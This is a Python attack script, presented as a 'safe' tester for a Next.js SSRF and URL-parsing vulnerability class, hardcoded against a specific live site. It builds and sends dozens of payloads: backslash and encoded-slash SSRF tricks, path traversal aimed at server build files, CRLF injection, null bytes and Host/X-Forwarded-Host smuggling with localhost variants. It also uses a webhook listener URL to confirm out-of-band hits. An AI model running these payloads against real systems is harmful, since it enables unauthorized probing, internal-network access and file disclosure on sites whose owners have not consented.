#!/usr/bin/env python3
"""
next15_ultra_max_tester_v4.py
Ultra-aggressive but 100% safe GET-only tester for CVE-2025-66478 class issues.
Focus: Next.js App Router, URL parsing, SSRF, redirect misrouting, image loader,
RSC, actions, proto confusion, smuggled hosts, ambiguous/opaque URLs.

Output:
  - stdout progress
  - ultra_max_results.json
"""

import requests, urllib.parse, json, time, random, string, sys
from typing import List

# ==========================================================
# CONFIG
# ==========================================================
TARGET = "https://demo.djangocfg.com"
PROVE_URL = "https://example.webhook.site/poc-id"   # optional
OUTFILE = "ultra_max_results.json"
TIMEOUT = 8
SLEEP = 0.2
MAX_REDIRECTS = 12
HEADERS = {"User-Agent": "next15-ultra-max-tester/4.0"}


# ==========================================================
# UTIL
# ==========================================================
def randtag(n=10): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
TAG = randtag()

def pct(s: str) -> str: return urllib.parse.quote(s, safe='')
def double_pct(s: str) -> str: return pct(pct(s))
def unicode_slash(): return "%EF%BC%8F"  # fullwidth slash
def unicode_bs(): return "%EF%BC%BC"     # fullwidth backslash
def nullb(): return "%00"


print(f"[+] Next15 ULTRA-MAX Tester v4 — tag={TAG}")
print("[+] Target:", TARGET)
if PROVE_URL: print("[+] Prove URL:", PROVE_URL)
print()


# ==========================================================
# BUILD PAYLOADS
# ==========================================================
def build_payloads(prove: str):
    p = urllib.parse.urlparse(prove) if prove else None
    host = p.netloc if p else "example.com"
    base = []
    add = base.append

    # -----------------------------
    # BASIC
    # -----------------------------
    add("/%5C%5Clocalhost:3000")
    add("/%5Chttp://127.0.0.1")
    add("//127.0.0.1:3000")
    add("//http://localhost:3000")

    # -----------------------------
    # PROVE URL variants
    # -----------------------------
    if prove:
        add("/%5C" + prove)
        add("/%5C%5C" + prove)
        add("//" + prove)
        add("/" + pct("\\http://") + host)
        add("/" + double_pct("\\") + prove)
        add("/" + unicode_slash() + prove)

    # -----------------------------
    # UNICODE, ENCODED, PROTO CONFUSION
    # -----------------------------
    add("/" + unicode_slash() + "%5C%5C" + host)
    add("/h%74tp://127.0.0.1")
    add("/http:////////127.0.0.1:3000")
    add("/http:/localhost:3000")       # opaque origin
    add("/ht%74p:////\\127.0.0.1/")
    add("/h%74tp:/%5C%5C127.0.0.1")

    # -----------------------------
    # CREDENTIALS
    # -----------------------------
    add("/http://user:pass@127.0.0.1:3000")
    add("/https://demo.com@127.0.0.1:3000/")
    add("/https://127.0.0.1:3000@demo.com/")

    # -----------------------------
    # FRAGMENT
    # -----------------------------
    add("/#\\http://127.0.0.1:3000")
    if prove:
        add("/#" + pct(prove))

    # -----------------------------
    # QUERY SMUGGLE
    # -----------------------------
    add("/?u=%5C127.0.0.1")
    add("/?url=%255C%255C" + pct("http://127.0.0.1"))
    add("/?src=http:/127.0.0.1")
    add("/?redirect=" + pct("\\\\") + pct("http://127.0.0.1"))

    # -----------------------------
    # DOUBLE ENCODE / NULL BYTE
    # -----------------------------
    add("/%255C%255C127.0.0.1")
    add("/%5Chttp://127.0.0.1" + nullb())

    # -----------------------------
    # CRLF SAFE
    # -----------------------------
    add("/%0d%0aHost:127.0.0.1")
    add("/%0d%0aGET http://127.0.0.1")

    # -----------------------------
    # NEXT-SPECIFIC
    # -----------------------------
    if prove:
        add("/_next/image?url=" + pct("\\\\" + prove) + "&w=64&q=75")
        add("/_next/image?url=" + pct("//" + prove) + "&w=64&q=75")
        add("/opengraph-image.png?u=%5C" + prove)

    add("/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js")
    add("/_next/static/%2E%2E/%2E%2E/server/app/layout.js")
    add("/api/fetch/%5C" + host)
    add("/search?q=%5C" + pct("http://127.0.0.1"))

    # -----------------------------
    # HOST SMUGGLE CANDIDATES
    # -----------------------------
    add("/%5C%5C127.0.0.1")
    add("/%5C%5C" + (prove if prove else "http://example.com"))

    # Expand
    payloads = {}
    for i, pth in enumerate(base):
        name = f"p{i:03d}"
        if "?" in pth:
            payloads[name] = pth + "&tag=" + TAG
        else:
            payloads[name] = pth + "?tag=" + TAG
    return payloads


# ==========================================================
# REQUEST + REDIRECT WALK
# ==========================================================
def send_and_walk(path: str, headers=None):
    if headers is None: headers = HEADERS
    url = TARGET + path
    chain = []

    try:
        r = requests.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
    except Exception as e:
        return {"error": str(e), "chain": []}

    chain.append({"url": url, "status": r.status_code, "location": r.headers.get("location"),
                  "text": r.text[:300] if r.text else ""})

    hops = 0
    while r.headers.get("location") and hops < MAX_REDIRECTS:
        loc = r.headers.get("location")
        next_url = urllib.parse.urljoin(TARGET, loc)
        try:
            r = requests.get(next_url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            chain.append({"url": next_url, "error": str(e)})
            break

        chain.append({"url": next_url, "status": r.status_code,
                      "location": r.headers.get("location"),
                      "text": r.text[:300] if r.text else ""})
        hops += 1

    return {"initial": {"path": path, "final": chain[-1]}, "chain": chain}


# ==========================================================
# DETECTION
# ==========================================================
def detect_indicator(chain_list: List[dict], prove: str):
    text = json.dumps(chain_list).lower()
    ind = []

    suspicious = [
        "127.", "localhost", "0.0.0.0", "169.254.",
        "10.", "192.168.", "::1",
        "metadata", "/server/app", "/.next/server",
        "aws", "gce", "azure"
    ]
    for s in suspicious:
        if s in text:
            ind.append(s)

    if prove and prove.lower() in text:
        ind.append("prove_url_hit")

    # protocol downgrade
    if "http:/" in text and "https" not in text:
        ind.append("proto_downgrade")

    # backslash scheme
    if "\\http" in text:
        ind.append("backslash_scheme")

    # unexpected internal redirection
    if any(("location" in j) and ("127" in str(j)) for j in chain_list):
        ind.append("internal_redirect")

    return ind


# ==========================================================
# HOST SMUGGLE VARIANTS
# ==========================================================
HOST_MATRIX = [
    "127.0.0.1", "localhost", "0.0.0.0", "::1",
    "127.0.0.1:80", "127.0.0.1:3000", "internal",
    "example", "test", "demo", "invalid..domain",
    "2130706433", "0x7f000001", "017700000001",
]

def try_host_smuggle(path, override):
    headers = HEADERS.copy()
    headers["Host"] = override
    headers["X-Forwarded-Host"] = override
    return send_and_walk(path, headers=headers)


# ==========================================================
# MAIN
# ==========================================================
def main():
    results = {}
    payloads = build_payloads(PROVE_URL)

    print("[+] Total payloads:", len(payloads))
    print("[+] Starting tests...\n")

    for name, path in payloads.items():
        print(f"[>] {name}: {path}")
        res = send_and_walk(path)
        inds = detect_indicator(res.get("chain", []), PROVE_URL)
        results[name] = {"path": path, "res": res, "indicators": inds}
        print("    -> status:", res.get("initial", {}).get("final", {}).get("status"),
              "indicators:", inds)
        time.sleep(SLEEP)

        # Host-smuggling only for suspicious prefixes
        if "%5c" in path.lower() or "//" in path[:4]:
            for hv in HOST_MATRIX:
                print(f"      -> Host smuggle: Host={hv}")
                r2 = try_host_smuggle(path, hv)
                ind2 = detect_indicator(r2.get("chain", []), PROVE_URL)
                results[f"{name}_host_{hv}"] = {"path": path, "res": r2, "indicators": ind2}
                print("         indicators:", ind2)
                time.sleep(SLEEP)

    # ------------------------------------------------------
    # HTTP/2 upgrade probe
    # ------------------------------------------------------
    print("\n[+] HTTP/2 upgrade probe...")
    try:
        r_h2 = requests.get(TARGET, headers={"Upgrade": "h2c", **HEADERS}, timeout=TIMEOUT)
        results["h2_probe"] = {"status": r_h2.status_code,
                               "upgrade": r_h2.headers.get("upgrade"),
                               "snippet": r_h2.text[:200]}
        print("    -> done")
    except:
        print("    -> failed")

    # ------------------------------------------------------
    # SUMMARY
    # ------------------------------------------------------
    print("\n[+] Indicators summary:")
    bad = 0
    for k, v in results.items():
        if v.get("indicators"):
            print("   !!!", k, "=>", v["indicators"])
            bad += 1
    if bad == 0:
        print("   No direct SSRF / proto / host-smuggle indicators found.")

    with open(OUTFILE, "w") as f:
        json.dump({"target": TARGET, "prove": PROVE_URL,
                   "tag": TAG, "results": results}, f, indent=2)

    print(f"\n[+] Full results written to {OUTFILE}")
    print("[+] Check your PROVE_URL listener for incoming requests with tag:", TAG)


if __name__ == "__main__":
    main()
